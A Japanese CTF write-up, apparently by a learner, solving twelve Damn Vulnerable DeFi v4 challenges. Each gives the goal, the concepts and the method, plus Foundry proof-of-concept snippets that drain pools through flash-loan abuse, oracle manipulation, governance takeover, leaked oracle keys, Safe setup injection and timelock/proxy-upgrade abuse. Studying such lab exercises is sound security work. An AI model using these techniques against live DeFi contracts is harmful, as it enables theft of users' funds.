Damn Vulnerable DeFi v4 攻略メモ
by tinamints

1. Unstoppable
条件 :
- ヴォールトを停止させる
概念 :
    1. フラッシュローン
    2. DoS攻撃
解法 :
- `deposit`を使わずに直接トークンを送ることで `convertToShares(totalSupply) != balanceBefore` を成立させてリバートを引き起こす（`totalSupply`は`deposit`経由でしか更新されないため）
# POC
` function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 1);
    }
`

2. Naive Receiver
条件 :
- プール内の全資金をリカバリーアカウントへ移す
- 2トランザクション以内で完了する
概念 :
    1. フラッシュローン
解法 :
- receiverを対象に指定して手数料でETHを全額消費させ、feeReceiverになりすまして蓄積したWETHを引き出す
# POC
` function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory data = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver),
                address(weth),
                0,
                ""
            );
        }
        pool.multicall(data);

        vm.startPrank(address(deployer));
        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
        vm.stopPrank();
    }
`

3. Truster
条件 :
    1. 全資金をリカバリーアカウントへ移す
    2. 1トランザクションで完了する
概念 :
    1. フラッシュローン
    2. 未検証の引数
解法 :
- `target`にプールを指定し`data`に`approve`を渡すことで、プール自身が攻撃者のトークン使用を承認するよう仕向ける
# POC
`function test_truster() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
        attacker.attack();
    }`

4. Side Entrance
条件 :
    1. 全ETHをリカバリーアカウントへ移す
概念 :
    1. 担保付きフラッシュローン
解法 :
- フラッシュローン中に`execute`が呼ばれることを利用し、借りたETHをそのまま`deposit`してプール内の`balance`を増やし、後から`withdraw`する権利を得る
# POC
` function test_sideEntrance() public checkSolvedByPlayer {
        SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
        exploit.exploit();
    }
`

5. The Rewarder
条件 :
    1. できる限り多くの資金をリカバリーアカウントへ移す
    2. ディストリビューターを操作するにはbeneficiariesに登録されている必要がある
概念 :
    1. 制限付き配布
    2. マークルツリーシステム
解法 :
- `claimRewards()`が同一トークンの請求を使用済みとしてマークしないことを悪用し、同じトークンを1回の呼び出しで何度も請求して全額を引き出す
# POC
` function test_theRewarder() public checkSolvedByPlayer {
        // DVT・WETHの報酬JSONを読み込み、プレイヤーのマークルプルーフを構築
        // 各トークンを全額請求するのに必要な回数を計算してclaimsを埋める
        distributor.claimRewards({ inputClaims: claims, inputTokens: tokensToClaim });
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
`

6. Selfie
条件 :
- プール内の全トークンをリカバリーアカウントへ移す
概念 :
    1. フラッシュローン
    2. ガバナンス投票権の操作
解法 :
- フラッシュローンでプールのトークンを一時的に借りて過半数の投票権を獲得し、`emergencyExit`をガバナンスアクションとしてキューに登録、ローンを返済後2日待ってアクションを実行する
# POC
` function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
        vm.warp(block.timestamp + 2 days);
        governance.executeAction(1);
    }
`

7. Compromised
条件 :
- エクスチェンジの全ETHをリカバリーアカウントへ移す
- プレイヤーはNFTを保有しないこと
- NFT価格は変わらないこと
概念 :
    1. オラクル価格操作
    2. 秘密鍵の漏洩
解法 :
- READMEのhex文字列から2つのオラクルの秘密鍵をデコードし、NFT価格を0に設定、1weiで購入、価格を999ETHに戻してNFTを売却、ETHをリカバリーへ送る
# POC
` function test_compromised() public checkSolved {
        vm.prank(source1); oracle.postPrice("DVNFT", 0);
        vm.prank(source2); oracle.postPrice("DVNFT", 0);
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();
        nft.approve(address(exchange), nftId);
        vm.stopPrank();
        vm.prank(source1); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2); oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.startPrank(player);
        exchange.sellOne(nftId);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
`

8. Puppet
条件 :
- レンディングプールの全DVT（10万枚）をリカバリーアカウントへ移す
- 1トランザクションで完了する
概念 :
    1. Uniswap V1 オラクル価格操作
    2. EIP-2612 permit
解法 :
- プレイヤーの1000 DVTをUniswap V1に売却してトークン価格を暴落させ、`calculateDepositRequired`の要求担保額をほぼゼロにする。permitを使って1txで全プールトークンを借り出す
# POC
` function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
            address(token), address(lendingPool), address(uniswapV1Exchange), recovery
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }
`

9. Puppet V2
条件 :
- レンディングプールの全DVT（100万枚）をリカバリーアカウントへ移す
概念 :
    1. Uniswap V2 オラクル価格操作
    2. WETH担保
解法 :
- プレイヤーの1万DVTをUniswap V2で全売却してDVT価格を暴落させ、最小限のWETH担保で100万枚のトークンを借り出す
# POC
` function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(tokensToSell, 0, path, player, block.timestamp + 1);
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        weth.deposit{value: ethBalance}();
        weth.approve(address(lendingPool), requiredWETH);
        lendingPool.borrow(poolTokens);
        token.transfer(recovery, token.balanceOf(player));
    }
`

10. Free Rider
条件 :
- マーケットプレイスの全NFT（6点）を奪取する
- プレイヤーがバウンティ（45 ETH）を獲得する
概念 :
    1. Uniswap V2 フラッシュローン
    2. NFTマーケットプレイスの購入ロジックのバグ
解法 :
- Uniswapから15 ETH（NFT1枚分の価格）をフラッシュローンで借りる。マーケットの`buyMany`は`msg.value >= price`を1回しかチェックせず全6枚を購入できる上、ETHを売り手ではなく買い手に送るバグがある。6枚を15 ETHで購入してrecoveryManagerに転送し45 ETHのバウンティを受け取る
# POC
` function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace), address(recoveryManager), address(nft),
            address(uniswapPair), address(token), address(weth), address(player)
        );
        attacker.flashLoanInitilizer(15 ether);
    }
`

11. Backdoor
条件 :
- 全40 DVTをリカバリーアカウントへ移す
- 1トランザクションで完了する
概念 :
    1. Safeプロキシファクトリー
    2. setup時の任意呼び出し注入
解法 :
- `createProxyWithCallback`の`initializer`引数を悪用し、Safeの`setup()`中に`approve`を実行させる。WalletRegistryが新ウォレットに10 DVTを送ると即座に`transferFrom`で引き出す。4ユーザー分繰り返す
# POC
` function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory), address(singletonCopy),
            address(walletRegistry), address(token), recovery, users
        );
    }
`

12. Climber
条件 :
- ヴォールトの全DVT（1000万枚）をリカバリーアカウントへ移す
概念 :
    1. タイムロックの実行前スケジュール確認漏れ
    2. UUPSプロキシアップグレード
解法 :
- `execute()`はアクションのスケジュール確認より先に実行する。バッチ実行: ①遅延を0に設定 ②攻撃コントラクトにproposerロールを付与 ③ヴォールトを悪意のある実装にアップグレード ④コールバック内でバッチを後から`schedule`。その後アップグレード済みヴォールトの`sweepFunds`を呼ぶ
# POC
` function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();
        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)), payable(address(timelock)), recovery, address(token)
        );
        attackContract.attack(address(maliciousImpl));
    }
`

